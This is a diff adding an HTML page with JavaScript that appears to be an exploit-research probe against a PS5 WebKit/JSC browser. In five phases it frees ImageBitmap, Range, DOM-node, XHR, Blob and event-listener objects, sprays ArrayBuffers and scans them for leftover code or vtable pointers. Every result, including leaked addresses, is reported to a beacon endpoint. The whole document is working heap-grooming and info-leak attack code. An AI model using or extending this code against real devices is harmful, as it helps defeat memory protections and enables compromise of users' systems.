@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P856</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:11px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:93vh;overflow-y:auto;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P856: Sync-Free Vtable Hunt</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P856-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,1800))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+bn('BOOT','start');
+log('Sync-free object destruction + AB spray for vtable residue','info');
+log('Goal: find code pointers in freed objects via BigUint64Array','info');
+log('','');
+
+/* Helper: check if value looks like a code/vtable pointer
+   PS5 userland VA: 0x00000001_xxxxxxxx to 0x000000FF_xxxxxxxx
+   Code pointers tend to be in specific ranges
+   Heap is around 0x00000010_xxxxxxxx
+   We want non-heap, non-zero, non-sentinel pointers */
+function isCodePtr(bv) {
+  if (bv === 0n) return false;
+  if (bv === 0xFFFFFFFFFFFFFFFFn) return false;
+  if (bv === 0xFFFFFFFF00000000n) return false;
+  var hi = Number(bv >> 32n);
+  var lo = Number(bv & 0xFFFFFFFFn);
+  /* Heap range: 0x10_xxxxxxxx */
+  if (hi >= 0x10 && hi <= 0x1F) return false; /* Skip heap addresses */
+  /* Candidate code pointer: non-zero high bits but not in heap range */
+  if (hi >= 1 && hi <= 0xFF && lo > 0) return true;
+  return false;
+}
+function isAnyPtr(bv) {
+  if (bv === 0n) return false;
+  if (bv === 0xFFFFFFFFFFFFFFFFn) return false;
+  if (bv === 0xFFFFFFFF00000000n) return false;
+  if (bv === 1n) return false; /* refcount */
+  var hi = Number(bv >> 32n);
+  if (hi >= 1 && hi <= 0xFF) return true;
+  return false;
+}
+
+/* ============================================================
+ * PHASE A: ImageBitmap.close() + AB spray
+ * ImageBitmap wraps a ShareableBitmap/NativeImage (C++ with vtable)
+ * close() is SYNCHRONOUS — frees internal bitmap immediately
+ * ============================================================ */
+log('=== PHASE A: ImageBitmap.close() vtable hunt ===','hot');
+bn('PHASE-A','start');
+
+var phaseADone = false;
+try {
+  /* Create source canvas for ImageBitmap */
+  var srcC = document.createElement('canvas');
+  srcC.width = 4; srcC.height = 4;
+  var srcCtx = srcC.getContext('2d');
+  srcCtx.fillStyle = '#FF0000';
+  srcCtx.fillRect(0, 0, 4, 4);
+
+  /* Create many ImageBitmaps */
+  var bmCount = 200;
+  var promises = [];
+  for (var i = 0; i < bmCount; i++) {
+    promises.push(createImageBitmap(srcC, 0, 0, 4, 4));
+  }
+
+  Promise.all(promises).then(function(bitmaps) {
+    log('  Created ' + bitmaps.length + ' ImageBitmaps', 'info');
+    bn('PHASE-A-CREATED', 'count=' + bitmaps.length);
+
+    /* Close ALL synchronously */
+    for (var i = 0; i < bitmaps.length; i++) {
+      bitmaps[i].close();
+    }
+    log('  Closed all ' + bitmaps.length + ' bitmaps synchronously', 'info');
+
+    /* IMMEDIATELY spray ABs at various sizes */
+    var sizes = [32, 48, 64, 80, 96, 128, 160, 192, 256];
+    var allABs = {};
+    var totalHits = 0;
+    var hitDetails = [];
+
+    for (var s = 0; s < sizes.length; s++) {
+      var sz = sizes[s];
+      var abs = [];
+      for (var i = 0; i < 500; i++) abs.push(new ArrayBuffer(sz));
+      allABs[sz] = abs;
+
+      /* Scan for code pointers */
+      var sizeHits = 0;
+      for (var i = 0; i < abs.length; i++) {
+        var bv = new BigUint64Array(abs[i]);
+        for (var j = 0; j < bv.length; j++) {
+          if (isCodePtr(bv[j])) {
+            sizeHits++;
+            totalHits++;
+            if (hitDetails.length < 10) {
+              hitDetails.push('sz' + sz + '[' + i + '][' + j + ']=0x' + bv[j].toString(16));
+            }
+          }
+        }
+      }
+      if (sizeHits > 0) {
+        log('  SIZE ' + sz + ': ' + sizeHits + ' code-ptr hits!', 'hot');
+      }
+    }
+
+    var sA = 'total=' + totalHits + '|sizes=' + sizes.join(',');
+    if (hitDetails.length > 0) {
+      sA += '|hits=' + hitDetails.join(';');
+      log('  HITS: ' + hitDetails.join(', '), 'hot');
+    } else {
+      log('  No code pointers found', 'info');
+    }
+    bn('PHASE-A-RESULT', sA);
+
+    /* Also scan for ANY non-zero pointer (including heap) */
+    var anyPtrCount = 0;
+    var anyPtrSamples = [];
+    for (var sz in allABs) {
+      var abs = allABs[sz];
+      for (var i = 0; i < abs.length; i++) {
+        var bv = new BigUint64Array(abs[i]);
+        for (var j = 0; j < bv.length; j++) {
+          if (isAnyPtr(bv[j])) {
+            anyPtrCount++;
+            if (anyPtrSamples.length < 15) {
+              anyPtrSamples.push('sz' + sz + '[' + i + '][' + j + ']=0x' + bv[j].toString(16));
+            }
+          }
+        }
+      }
+    }
+    log('  Any-pointer scan: ' + anyPtrCount + ' hits', anyPtrCount > 0 ? 'hot' : 'info');
+    bn('PHASE-A-ANY', 'anyPtr=' + anyPtrCount + '|samp=' + anyPtrSamples.join(';').slice(0,600));
+
+    phaseADone = true;
+    setTimeout(phaseB, 10);
+  }).catch(function(e) {
+    log('  ImageBitmap error: ' + e.message, 'fail');
+    bn('PHASE-A-ERR', e.message.slice(0,200));
+    phaseADone = true;
+    setTimeout(phaseB, 10);
+  });
+} catch(e) {
+  log('  Phase A setup error: ' + e.message, 'fail');
+  bn('PHASE-A-SETUP-ERR', e.message.slice(0,200));
+  phaseADone = true;
+  setTimeout(phaseB, 10);
+}
+
+/* ============================================================
+ * PHASE B: DOM object sync destruction + AB spray
+ * Range, Comment, Text, DocumentFragment — all have C++ vtables
+ * removeChild / detach is synchronous
+ * ============================================================ */
+function phaseB() {
+  log('','');
+  log('=== PHASE B: DOM object destruction + AB spray ===','hot');
+  bn('PHASE-B','start');
+
+  try {
+    /* Create and destroy many Range objects */
+    var ranges = [];
+    for (var i = 0; i < 500; i++) {
+      ranges.push(document.createRange());
+    }
+    /* Detach all */
+    for (var i = 0; i < ranges.length; i++) {
+      ranges[i].detach();
+    }
+    ranges = null; /* Drop JS references */
+
+    /* Also create+remove many Text/Comment nodes */
+    var container = document.createElement('div');
+    document.body.appendChild(container);
+    var nodes = [];
+    for (var i = 0; i < 500; i++) {
+      var t = document.createTextNode('x' + i);
+      container.appendChild(t);
+      nodes.push(t);
+    }
+    /* Remove all */
+    for (var i = 0; i < nodes.length; i++) {
+      container.removeChild(nodes[i]);
+    }
+    nodes = null;
+    container.remove();
+
+    /* DocumentFragment batch */
+    var frags = [];
+    for (var i = 0; i < 200; i++) {
+      var f = document.createDocumentFragment();
+      f.appendChild(document.createTextNode('frag' + i));
+      frags.push(f);
+    }
+    frags = null;
+
+    /* SPRAY: target Range size (~64-96B), Text/Comment (~48-96B) */
+    var sizes = [32, 48, 64, 80, 96, 128];
+    var allABs = {};
+    var totalHits = 0;
+    var hitDetails = [];
+
+    for (var s = 0; s < sizes.length; s++) {
+      var sz = sizes[s];
+      var abs = [];
+      for (var i = 0; i < 800; i++) abs.push(new ArrayBuffer(sz));
+      allABs[sz] = abs;
+
+      var sizeHits = 0;
+      for (var i = 0; i < abs.length; i++) {
+        var bv = new BigUint64Array(abs[i]);
+        for (var j = 0; j < bv.length; j++) {
+          if (isCodePtr(bv[j])) {
+            sizeHits++;
+            totalHits++;
+            if (hitDetails.length < 10) {
+              hitDetails.push('sz' + sz + '[' + i + '][' + j + ']=0x' + bv[j].toString(16));
+            }
+          }
+        }
+      }
+      if (sizeHits > 0) log('  SIZE ' + sz + ': ' + sizeHits + ' code-ptr hits!', 'hot');
+    }
+
+    log('  DOM destruction: ' + totalHits + ' code-ptr hits', totalHits > 0 ? 'hot' : 'info');
+    bn('PHASE-B-RESULT', 'total=' + totalHits + '|hits=' + hitDetails.join(';').slice(0,600));
+
+    /* Any-pointer scan */
+    var anyPtr = 0;
+    var anySamp = [];
+    for (var sz in allABs) {
+      var abs = allABs[sz];
+      for (var i = 0; i < abs.length; i++) {
+        var bv = new BigUint64Array(abs[i]);
+        for (var j = 0; j < bv.length; j++) {
+          if (isAnyPtr(bv[j])) {
+            anyPtr++;
+            if (anySamp.length < 15) anySamp.push('sz' + sz + '[' + i + '][' + j + ']=0x' + bv[j].toString(16));
+          }
+        }
+      }
+    }
+    log('  Any-pointer: ' + anyPtr + ' hits', anyPtr > 0 ? 'hot' : 'info');
+    bn('PHASE-B-ANY', 'any=' + anyPtr + '|samp=' + anySamp.join(';').slice(0,600));
+
+  } catch(e) {
+    log('  Phase B error: ' + e.message, 'fail');
+    bn('PHASE-B-ERR', e.message.slice(0,200));
+  }
+
+  setTimeout(phaseC, 10);
+}
+
+/* ============================================================
+ * PHASE C: XHR abort + Blob revoke + AB spray
+ * XHR internal state objects may have vtables
+ * Blob backing stores might leave residue
+ * ============================================================ */
+function phaseC() {
+  log('','');
+  log('=== PHASE C: XHR abort + Blob revoke ===','hot');
+  bn('PHASE-C','start');
+
+  try {
+    /* Create and abort many XHRs */
+    var xhrs = [];
+    for (var i = 0; i < 100; i++) {
+      var x = new XMLHttpRequest();
+      x.open('GET', '/beacon.php?tag=P856-DUMMY&data=x&t=' + Date.now(), true);
+      x.send();
+      xhrs.push(x);
+    }
+    /* Abort all immediately */
+    for (var i = 0; i < xhrs.length; i++) {
+      xhrs[i].abort();
+    }
+    xhrs = null;
+
+    /* Create and revoke many Blob URLs */
+    var blobUrls = [];
+    for (var i = 0; i < 200; i++) {
+      var b = new Blob(['data' + i], {type: 'text/plain'});
+      var url = URL.createObjectURL(b);
+      blobUrls.push(url);
+    }
+    /* Revoke all */
+    for (var i = 0; i < blobUrls.length; i++) {
+      URL.revokeObjectURL(blobUrls[i]);
+    }
+    blobUrls = null;
+
+    /* Spray */
+    var sizes = [32, 48, 64, 96, 128, 192, 256];
+    var totalHits = 0;
+    var hitDetails = [];
+    var anyPtr = 0;
+
+    for (var s = 0; s < sizes.length; s++) {
+      var sz = sizes[s];
+      var abs = [];
+      for (var i = 0; i < 600; i++) abs.push(new ArrayBuffer(sz));
+
+      for (var i = 0; i < abs.length; i++) {
+        var bv = new BigUint64Array(abs[i]);
+        for (var j = 0; j < bv.length; j++) {
+          if (isCodePtr(bv[j])) {
+            totalHits++;
+            if (hitDetails.length < 10) hitDetails.push('sz' + sz + '[' + i + '][' + j + ']=0x' + bv[j].toString(16));
+          }
+          if (isAnyPtr(bv[j])) anyPtr++;
+        }
+      }
+    }
+
+    log('  XHR+Blob: code=' + totalHits + ' any=' + anyPtr, (totalHits + anyPtr) > 0 ? 'hot' : 'info');
+    bn('PHASE-C-RESULT', 'code=' + totalHits + '|any=' + anyPtr + '|hits=' + hitDetails.join(';').slice(0,400));
+
+  } catch(e) {
+    log('  Phase C error: ' + e.message, 'fail');
+    bn('PHASE-C-ERR', e.message.slice(0,200));
+  }
+
+  setTimeout(phaseD, 10);
+}
+
+/* ============================================================
+ * PHASE D: Event listener + Promise + WeakRef churn
+ * addEventListener/removeEventListener frees internal structures
+ * Promise rejection might leave internal state
+ * ============================================================ */
+function phaseD() {
+  log('','');
+  log('=== PHASE D: EventListener + Promise churn ===','hot');
+  bn('PHASE-D','start');
+
+  try {
+    /* Event listener churn */
+    var el = document.createElement('div');
+    var handlers = [];
+    for (var i = 0; i < 500; i++) {
+      var h = function(){};
+      el.addEventListener('click', h);
+      handlers.push(h);
+    }
+    for (var i = 0; i < handlers.length; i++) {
+      el.removeEventListener('click', handlers[i]);
+    }
+    handlers = null;
+    el = null;
+
+    /* Promise churn — create and reject many */
+    for (var i = 0; i < 500; i++) {
+      new Promise(function(_, reject) { reject(i); }).catch(function(){});
+    }
+
+    /* WeakRef churn — create targets, let them go */
+    var weakRefs = [];
+    for (var i = 0; i < 200; i++) {
+      var obj = {idx: i, data: new ArrayBuffer(16)};
+      weakRefs.push(new WeakRef(obj));
+    }
+    /* Drop strong refs */
+    weakRefs = null;
+
+    /* Spray */
+    var sizes = [16, 32, 48, 64, 96, 128];
+    var totalHits = 0;
+    var anyPtr = 0;
+    var hitDetails = [];
+
+    for (var s = 0; s < sizes.length; s++) {
+      var sz = sizes[s];
+      var abs = [];
+      for (var i = 0; i < 800; i++) abs.push(new ArrayBuffer(sz));
+
+      for (var i = 0; i < abs.length; i++) {
+        var bv = new BigUint64Array(abs[i]);
+        for (var j = 0; j < bv.length; j++) {
+          if (isCodePtr(bv[j])) {
+            totalHits++;
+            if (hitDetails.length < 10) hitDetails.push('sz' + sz + '[' + i + '][' + j + ']=0x' + bv[j].toString(16));
+          }
+          if (isAnyPtr(bv[j])) anyPtr++;
+        }
+      }
+    }
+
+    log('  Events+Promise: code=' + totalHits + ' any=' + anyPtr, (totalHits + anyPtr) > 0 ? 'hot' : 'info');
+    bn('PHASE-D-RESULT', 'code=' + totalHits + '|any=' + anyPtr + '|hits=' + hitDetails.join(';').slice(0,400));
+
+  } catch(e) {
+    log('  Phase D error: ' + e.message, 'fail');
+    bn('PHASE-D-ERR', e.message.slice(0,200));
+  }
+
+  setTimeout(phaseE, 10);
+}
+
+/* ============================================================
+ * PHASE E: Mass allocation + GC pressure + scan
+ * Force GC by allocating tons of objects, then spray and scan
+ * The GC sweep might free JSC internal objects (Structure, etc.)
+ * that have code pointers in their headers
+ * ============================================================ */
+function phaseE() {
+  log('','');
+  log('=== PHASE E: GC pressure + post-GC spray ===','hot');
+  bn('PHASE-E','start');
+
+  try {
+    /* Create tons of objects to force GC */
+    var garbage = [];
+    for (var i = 0; i < 50000; i++) {
+      garbage.push({a: i, b: new Array(10)});
+    }
+    /* Drop references to trigger GC */
+    garbage = null;
+
+    /* Additional GC pressure */
+    for (var i = 0; i < 10; i++) {
+      var tmp = new ArrayBuffer(1024 * 1024); /* 1MB each */
+      tmp = null;
+    }
+
+    /* Small delay for GC to run */
+    var scanResults = function() {
+      var sizes = [32, 48, 64, 96, 128, 192, 256, 384, 512];
+      var totalCode = 0;
+      var totalAny = 0;
+      var hitDetails = [];
+
+      for (var s = 0; s < sizes.length; s++) {
+        var sz = sizes[s];
+        var abs = [];
+        for (var i = 0; i < 400; i++) abs.push(new ArrayBuffer(sz));
+
+        for (var i = 0; i < abs.length; i++) {
+          var bv = new BigUint64Array(abs[i]);
+          for (var j = 0; j < bv.length; j++) {
+            if (isCodePtr(bv[j])) {
+              totalCode++;
+              if (hitDetails.length < 15) {
+                hitDetails.push('sz' + sz + '[' + i + '][' + j + ']=0x' + bv[j].toString(16));
+              }
+            }
+            if (isAnyPtr(bv[j])) totalAny++;
+          }
+        }
+      }
+
+      log('  Post-GC spray: code=' + totalCode + ' any=' + totalAny, (totalCode + totalAny) > 0 ? 'hot' : 'info');
+      if (hitDetails.length > 0) log('  HITS: ' + hitDetails.join(', '), 'hot');
+      bn('PHASE-E-RESULT', 'code=' + totalCode + '|any=' + totalAny + '|hits=' + hitDetails.join(';').slice(0,600));
+
+      log('','');
+      log('====== P856 COMPLETE ======','hot');
+      bn('DONE','complete');
+    };
+
+    setTimeout(scanResults, 100);
+
+  } catch(e) {
+    log('  Phase E error: ' + e.message, 'fail');
+    bn('PHASE-E-ERR', e.message.slice(0,200));
+    log('','');
+    log('====== P856 COMPLETE ======','hot');
+    bn('DONE','complete');
+  }
+}
+</script></body></html>
